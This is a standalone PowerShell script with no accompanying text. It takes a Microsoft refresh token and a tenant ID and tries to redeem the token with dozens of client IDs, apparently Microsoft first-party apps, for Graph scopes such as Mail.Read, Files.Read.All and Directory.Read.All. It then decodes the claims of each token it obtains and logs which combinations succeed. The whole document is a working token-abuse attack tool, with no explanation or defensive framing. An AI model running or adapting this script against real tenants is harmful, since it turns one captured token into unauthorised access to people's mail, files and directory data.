# === INPUTS ===
$refreshToken = "1.ARIAP......"
$tenant = "e122af3c-4c68-4e49-9c52-4ae1e25e91ae"
$clientIds = @(
    "00b41c95-dab0-4487-9791-b9d2c32c80f2",
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
    "1950a258-227b-4e31-a9cf-717495945fc2",
    "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
    "26a7ee05-5602-4d76-a7ba-eae8b7b67941",
    "27922004-5251-4030-b22d-91ecd9a37ea4",
    "4813382a-8fa7-425e-ab75-3b753aab3abb",
    "ab9b8c07-8f02-4f72-87fa-80105867a763",
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",
    "872cd9fa-d31f-45e0-9eab-6e460a02d1f1",
    "af124e86-4e96-495a-b70a-90f90ab96707",
    "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8",
    "844cca35-0656-46ce-b636-13f48b0eecbd",
    "87749df4-7ccf-48f8-aa87-704bad0e0e16",
    "cf36b471-5b44-428c-9ce7-313bf84528de",
    "0ec893e0-5785-4de6-99da-4ed124e5296c",
    "22098786-6e16-43cc-a27d-191a01a1e3b5",
    "4e291c71-d680-4d0e-9640-0a3358e31177",
    "57336123-6e14-4acc-8dcf-287b6088aa28",
    "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0",
    "66375f6b-983f-4c2c-9701-d680650f588f",
    "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223",
    "a40d7d7d-59aa-447e-a655-679a4107e548",
    "a569458c-7f2b-45cb-bab9-b7dee514d112",
    "b26aadf8-566f-4478-926f-589f601d9c74",
    "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12",
    "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0",
    "e9c51622-460d-4d3d-952d-966a5b1da34c",
    "eb539595-3fe1-474e-9c1d-feb3625d1be5",
    "ecd6b820-32c2-49b6-98a6-444530e5a77a",
    "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d",
    "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34",
    "be1918be-3fe3-4be9-b32b-b542fc27f02e",
    "cab96880-db5b-4e15-90a7-f3f1d62ffe39",
    "d7b530a4-7680-4c23-a8bf-c52c121d2e87",
    "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3",
    "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
)

$scopes = @(
    "https://graph.microsoft.com/.default",
    "https://graph.microsoft.com/User.Read",
    "https://graph.microsoft.com/Mail.Read",
    "https://graph.microsoft.com/Files.Read.All",
    "https://graph.microsoft.com/Directory.Read.All"
)

$results = @()

foreach ($clientId in $clientIds) {
    foreach ($scope in $scopes) {
        Write-Host "`n Trying client_id: $clientId with scope: $scope"

        $body = @{
            grant_type    = "refresh_token"
            client_id     = $clientId
            refresh_token = $refreshToken
            scope         = $scope
        }

        try {
            $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenant/oauth2/v2.0/token" `
                -Method POST `
                -Body $body `
                -ContentType "application/x-www-form-urlencoded"

            $claims = ($response.access_token -split '\.')[1] | ForEach-Object {
                $padded = $_.PadRight($_.Length + (4 - $_.Length % 4) % 4, '=').Replace('-', '+').Replace('_', '/')
                [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($padded)) | ConvertFrom-Json
            }

            $results += [pscustomobject]@{
                ClientId    = $clientId
                Scope       = $scope
                AccessToken = $response.access_token.Substring(0, 40) + "..."
                Audience    = $claims.aud
                Scopes      = $claims.scp -join ", "
                ExpiresIn   = $response.expires_in
                Success     = $true
            }

            Write-Host "SUCCESS"
        }
        catch {
            $results += [pscustomobject]@{
                ClientId    = $clientId
                Scope       = $scope
                AccessToken = $null
                Audience    = $null
                Scopes      = $null
                ExpiresIn   = $null
                Success     = $false
            }

            Write-Host "FAILED"
        }
    }
}

# === Export results ===
$results
